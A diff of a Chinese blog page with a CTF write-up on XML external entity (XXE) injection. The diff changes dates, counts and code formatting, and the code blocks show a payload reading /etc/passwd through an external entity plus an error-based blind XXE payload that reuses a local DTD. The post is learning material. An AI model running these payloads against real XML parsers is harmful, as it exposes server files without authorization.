@@ -92,7 +92,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/xxe.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/xxe0.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/xxe1.png">
-<meta property="og:updated_time" content="2019-08-15T13:47:01.327Z">
+<meta property="og:updated_time" content="2019-08-22T13:08:54.940Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="xxe学习">
 <meta name="twitter:description" content="今天做题的时候遇到了一个xxe相关的题目，难度不大，现场学习的xxe，事后来总结一下： 原题的名字是who are you，进去之后有一个输入框，输入什么就会回显什么，首先试了一下xss，只出现了alert(1) 查看页面的源代码发现： 123456789101112131415161718192021222324function play() &amp;#123;     return false; &amp;">
@@ -353,8 +353,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-08-15T21:47:01+08:00">
-                2019-08-15
+              <time title="Post modified" itemprop="dateModified" datetime="2019-08-22T21:08:54+08:00">
+                2019-08-22
               </time>
             
           </span>
@@ -403,7 +403,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  833
+                  849
                 </span>
               
 
@@ -456,9 +456,9 @@ DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</
 <p>DOCTYPE声明了XML由哪些标签，因为XML的标签不同于HTML，是可以自定义的。</p>
 <p>DTD可以在XML文档内部声明，也可以外部引用,同时实体也可以内部声明或者外部引用</p>
 <p><em>内部实体声明D</em></p>
-<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DTD 实例:</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">writer</span> "<span class="attr">Donald</span> <span class="attr">Duck.</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">copyright</span> "<span class="attr">Copyright</span> <span class="attr">runoob.com</span>"&gt;</span></span><br><span class="line"></span><br><span class="line">XML 实例：</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DTD 实例:</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY writer &quot;Donald Duck.&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright runoob.com&quot;&gt;</span><br><span class="line"></span><br><span class="line">XML 实例：</span><br><span class="line"></span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure></p>
 <p><em>外部实体声明</em></p>
-<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DTD 实例:</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">writer</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">www.runoob.com</span>/<span class="attr">entities.dtd</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">copyright</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">www.runoob.com</span>/<span class="attr">entities.dtd</span>"&gt;</span></span><br><span class="line"></span><br><span class="line">XML example:</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DTD 实例:</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">XML example:</span><br><span class="line"></span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure></p>
 <p>最常见的引入外部实体就是通过file协议读取文件：</p>
 <p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>另一种payload</p>
@@ -480,7 +480,7 @@ DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</
 <p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/xxe1.png" alt=""></p>
 <p>之后这个题目涉及到一个使用本地的dtd来盲注xxe的姿势：</p>
 <p>payload</p>
-<p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE message[</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY % ISOamso '</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passed"&gt;</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;&amp;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span><br><span class="line"><span class="meta">	&amp;#x25;eval;</span></span><br><span class="line"><span class="meta">	&amp;#x25;error;</span></span><br><span class="line"><span class="meta">	'&gt;</span></span><br><span class="line"><span class="meta">	%local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE message[</span><br><span class="line">	&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % ISOamso &apos;</span><br><span class="line">	&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passed&quot;&gt;</span><br><span class="line">	&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;&amp;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">	&amp;#x25;eval;</span><br><span class="line">	&amp;#x25;error;</span><br><span class="line">	&apos;&gt;</span><br><span class="line">	%local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p>
 <h2>参考</h2>
 <p><a href="https://zhuanlan.zhihu.com/p/36517036" target="_blank" rel="noopener">CTF学习--web--XXE</a></p>
 <p><a href="https://www.runoob.com/dtd/dtd-entities.html" target="_blank" rel="noopener">菜鸟教程</a></p>
@@ -610,7 +610,7 @@ DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-count">70</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -621,7 +621,7 @@ DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">10</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
@@ -632,7 +632,7 @@ DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-count">75</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
